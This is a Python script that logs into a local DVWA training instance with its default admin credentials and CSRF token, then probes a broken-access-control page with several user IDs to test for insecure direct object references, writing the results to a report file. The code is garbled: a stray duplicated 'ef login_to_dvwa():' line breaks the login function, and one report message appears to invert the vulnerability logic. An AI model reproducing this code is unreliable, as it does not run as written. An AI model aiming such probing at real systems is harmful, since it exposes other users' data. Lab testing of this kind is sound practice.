import requests
from bs4 import BeautifulSoup

# Configuration
DVWA_URL = 'http://localhost/dvwa/'
LOGIN_URL = 'http://localhost/dvwa/login.php'
VULN_URL = 'http://localhost/dvwa/vulnerabilities/broken_access_control/'
REPORT_FILE = 'idorreport.txt'

# DVWA Credentials
USERNAME = 'admin'
PASSWORD = 'admin'

# Function to perform IDOR attack
def perform_idor_attack(session, user_id):
    target_url = f'{VULN_URL}?user_id={user_id}'
    response = session.get(target_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    extracted_data = soup.find_all('pre')
    return target_url, [data.text.strip() for data in extracted_data]

# Function to login to DVWA and retrieve CSRF token
def login_to_dvwa():
    ef login_to_dvwa():
    session = requests.Session()
    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    
    # Extract CSRF token
    csrf_token = soup.find('input', {'name': 'user_token'})['value'] if soup.find('input', {'name': 'user_token'}) else None

    if not csrf_token:
        print('CSRF token not found in the login page HTML')
        return None

    # Debugging: Print CSRF token
    print(f'CSRF Token: {csrf_token}')

    # Login data
    login_data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login',
        'user_token': csrf_token
    }

    # Perform login
    response = session.post(LOGIN_URL, data=login_data)

    # Debugging: Print login response
    print(f'Login response status: {response.status_code}')
    print(response.text)

    if 'Login failed' in response.text:
        print('Login failed')
        return None
    
    return session

# Function to write report
def write_report(results):
    with open(REPORT_FILE, 'w') as report_file:
        report_file.write('DVWA Insecure Direct Object Reference Vulnerability Report\n')
        report_file.write('='*40 + '\n')

        for action, (target_url, extracted_data) in results.items():
            report_file.write(f'Test Action: {action}\n')
            report_file.write(f'Target URL: {target_url}\n\n')

            if extracted_data:
                report_file.write('Extracted Data:\n')
                for data in extracted_data:
                    report_file.write(data.strip() + '\n\n')
            else:
                report_file.write('No data extracted, the target may have insecure direct object reference.\n')

            report_file.write('='*40 + '\n\n')

# Main function to run the IDOR tests
def run_idor_tests():
    session = login_to_dvwa()

    if not session:
        return

    results = {}

    # IDOR test cases
    user_ids = [
        '1',  # admin user
        '2',  # user user
        '3',  # invalid user
        'abc'  # non-numeric user ID
    ]

    for user_id in user_ids:
        target_url, extracted_data = perform_idor_attack(session, user_id)
        results[user_id] = (target_url, extracted_data)

    session.close()
    write_report(results)
    print(f'Report generated: {REPORT_FILE}')

# Entry point of the script
if __name__ == '__main__':
    run_idor_tests()
